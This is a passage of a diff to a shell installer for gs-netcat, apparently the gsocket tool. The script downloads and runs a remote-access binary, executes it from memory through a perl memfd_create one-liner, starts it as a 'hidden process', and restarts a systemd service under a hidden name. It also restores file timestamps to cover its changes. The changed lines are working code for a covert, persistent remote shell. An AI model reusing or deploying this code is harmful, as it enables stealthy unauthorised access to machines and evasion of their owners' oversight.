+	GS_CONFIG_READ=0 GS_SECRET="$S" GS_ARGS="-i" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);open($p,"-|","'"${cmd_str}"'");print$o(<$p>);exec{"/proc/$$/fd/$f"}gs-netcat,@ARGV' -- "${ORIG_ARGS[@]}" && exit
+	ret="$?"
+	[ $ret -eq 61 ] && { GS_SECRET="${S}"; gs_access_fail_exit; }
+	WARN "Could not execute in memory. Try ${CDC}GS_NOMEMEXEC=1${CN}."
 }
 
 # Binary is in an executeable directory (no noexec-flag)
@@ -1905,11 +1979,13 @@ gs_access()
 # test_bin <binary>
 test_dstbin()
 {
+	local ret
 	unset IS_TESTBIN_OK
 
 	# Try to execute the binary
 	unset ERR_LOG
 	GS_OUT=$(GS_CONFIG_READ=0 "${DSTBIN_EXEC_ARR[@]}" -g 2>/dev/null)
+	ret=$?
 	[[ -z "$GS_OUT" ]] && {
 		# 126 - Exec format error
 		FAIL_OUT
@@ -2075,42 +2151,16 @@ try_network()
 }
 
 # install <osarch> <srcpackage>
-install()
-{
-	local osarch="$1"
-	local src_pkg="$2"
+install() {
+	local osarch="${1:?}"
+	local src_pkg="${2:?}"
 
-	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
 	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
 	echo -en "Downloading binaries.................................................."
-	dl "${src_pkg}" "${_GS_TMPDIR}/${src_pkg}"
-	OK_OUT
+	mk_file "${DSTBIN:?}" || { FAIL_OUT; errexit; }
+	dl "${src_pkg}" "${DSTBIN}"
 
-	echo -en "Unpacking binaries...................................................."
-	if [[ "${src_pkg}" == *.tar.gz ]]; then
-		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-		command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
-		(cd "${_GS_TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-		[[ -f "${_GS_TMPDIR}/._gs-netcat" ]] && rm -f "${_GS_TMPDIR}/._gs-netcat" # from docker???
-		[[ -n $GS_USELOCAL_GSNC ]] && {
-			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-			xcp "${GS_USELOCAL_GSNC}" "${_GS_TMPDIR}/gs-netcat"
-		}
-	else
-		mv "${_GS_TMPDIR}/${src_pkg}" "${_GS_TMPDIR}/gs-netcat"
-	fi
-	OK_OUT
-
-	echo -en "Copying binaries......................................................"
-	# SELinux bug (?): can not use 'xmv' because the destination file inherits the
-	# user_tmp_t flag from the source file (ls -Zl /sbin/supervise):
-	# -rwx------. 1 root root unconfined_u:object_r:user_tmp_t:s0 2328932 Jul  9 13:41 /sbin/supervise
-	# 'xcp' solves this elegantly by first creating a destination file with 'touch' (without
-	# the user_tmp_t flag) and the copying the source to the destination - which (shock)
-	# removes the user_tmp_t flag (!).
-	xcp "${_GS_TMPDIR}/gs-netcat" "${DSTBIN:?}" || { FAIL_OUT; errexit; }
-	rm -f "${_GS_TMPDIR}/gs-netcat"
 	if [[ -n "$LDSO" ]]; then
 		chmod 600 "$DSTBIN"
 	else
@@ -2121,11 +2171,11 @@ install()
 	echo -en "Testing binaries......................................................"
 	# [ -n "$GS_SECRET" ] && [ -n "$GS_NOTEST" ] && { IS_TESTBIN_OK=1; SKIP_OUT; return; }
 	test_dstbin
+
 	if [[ -n "$IS_TESTBIN_OK" ]]; then
 		OK_OUT
 		return
 	fi
-	rm -f "${_GS_TMPDIR}/${src_pkg:?}"
 }
 
 gs_start_systemd()
@@ -2149,8 +2199,8 @@ gs_start_systemd()
 	}
 
 	# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
-	# is needed. Thus fix Timestamp here and reload.
-	clean_all
+	# is needed. Thus fix Timestamp first and then reload.
+	ts_restore
 	systemctl daemon-reload
 	err=1
 	systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null && {
@@ -2163,7 +2213,7 @@ gs_start_systemd()
 	}
 	[[ -n "$err" ]] && {
 		FAIL_OUT "Check ${CM}systemctl status ${SERVICE_HIDDEN_NAME}${CN}."
-		exit_code 255
+		exit 255
 	}
 	IS_GS_RUNNING=1
 	OK_OUT
@@ -2234,16 +2284,14 @@ if [[ -z "$S" ]]; then
 	gs_secret_reload
 
 	GS_SECRET="${GS_SECRET_X}"
-else
-	GS_SECRET="$S"
-	URL_BIN="$URL_BIN_FULL"
 fi
+
 
 STARTING_STR="Starting ${CB}${BIN_HIDDEN_NAME}${CN} as hidden process ${CDC}${PROC_HIDDEN_NAME}${CN}"
 install "$OSARCH" "$SRC_PKG"
 
 WARN_EXECFAIL
-[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
+[[ -z "$IS_TESTBIN_OK" ]] && errexit "The binary did not work."
 
 [[ -z $S ]] && try_network
 
